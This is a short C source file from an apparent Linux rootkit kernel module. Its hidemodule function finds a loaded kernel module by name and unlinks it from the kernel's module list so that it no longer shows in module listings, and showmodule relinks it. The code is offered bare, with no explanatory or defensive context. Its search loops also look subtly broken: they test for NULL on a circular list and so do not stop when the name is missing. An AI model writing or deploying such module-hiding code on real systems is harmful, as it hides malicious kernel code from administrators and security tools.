//
// Created by sciver on 10/20/22.
//

#include "hide_driver.h"



static struct list_head *prev_module;
static struct list_head *copy_module;
static  struct module* mod_copy;

void hidemodule(char *name1)
{
    struct list_head* lh_p;
    struct module* mod_p;
    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){    // travese backward first
        mod_p = list_entry(lh_p, struct module, list);
        if(!strcmp(mod_p->name, name1)){ // found!
            //
            prev_module=mod_p->list.prev;
            copy_module=&mod_p->list;
            list_del(lh_p);
            return;
        }
        lh_p = mod_p->list.next;
    }
    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){
        mod_p = list_entry(lh_p, struct module, list);
        if(!strcmp(mod_p->name, name1)){
            prev_module=mod_p->list.prev;
            copy_module=&mod_p->list;
            list_del(lh_p);
            return;
        }
        lh_p = mod_p->list.prev;
    }

}

void showmodule(char  *name1)
{
    //list_add(&THIS_MODULE->list, prev_module);
    list_add(copy_module, prev_module);
}
